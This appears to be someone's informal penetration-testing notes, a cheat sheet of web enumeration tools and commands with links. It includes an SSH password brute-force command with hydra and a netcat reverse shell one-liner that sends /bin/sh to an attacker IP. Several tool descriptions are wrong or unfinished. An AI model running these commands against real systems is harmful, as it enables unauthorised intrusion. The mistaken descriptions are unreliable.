All commands and links i need to sort.  

Good high level guide on how to pentest. https://thehackernews.com/2024/10/guide-ultimate-pentest-checklist-for.html?m=1  
Recon  
Find Vuln  
Exploit  
Evlate   
Repeat  
ZAP better then burp  



## Web Enumeration ##
wappalyzer - good plugin for looking at website platforms or software. add this to my hacking soe  

crt.sh - website to search for subdomains.  

curl -u http://website - display website header and info  

whatweb www.site.com - good for looking at website platforms or software.

dirsearch -u http://website - enumerates subdirectories  
dirb http://website - enumerates subdirectories  
ffuf -w /usr/share/wordlists/dirbuster/:FUZZ -u http://website/FUZZ - enumerates subdirectories  
gobuster dir -u http://website -w /usr/share/seclist - enumerates subdirectories  
gobuster dns -d http://website -w dns Jhaddix.txt - enumerates subdirectories  
dirbuster is a gui version of the above tools 

sublist3r -d http://website - enumerates subdirectories  (add -t 10 for multithread or faster search)

nikto -h www.site.com  - scans website for platforms or software versions. also mentions where attacks could be possible. 

wpscan --url http://website --enumerate  u for user, p for plugins, t for themes  
wpscan --url http://website --enumerate  vp,vt --plugins-detection aggressive (need api token)  

amass enum -d domain --passive - gives XXXX  

hydra -l root -P /usr/share/wordlist ssh://ip -t 4 -V - does a password attack on ssh client.  

python3 -m http.server 80 -- Start at adhoc webserver, good for quickly sharing files.    

Simple reverse shell - Attacker machine sets up listener via nc -lvp 1337.  Target machine needs to call via nc <ipofattacker> -e /bin/sh 1337.   

## Online Tools ##
https://gchq.github.io/CyberChef/  -  
https://www.exploit-db.com/ - for manual exploit commands against vulnerabilities  
 
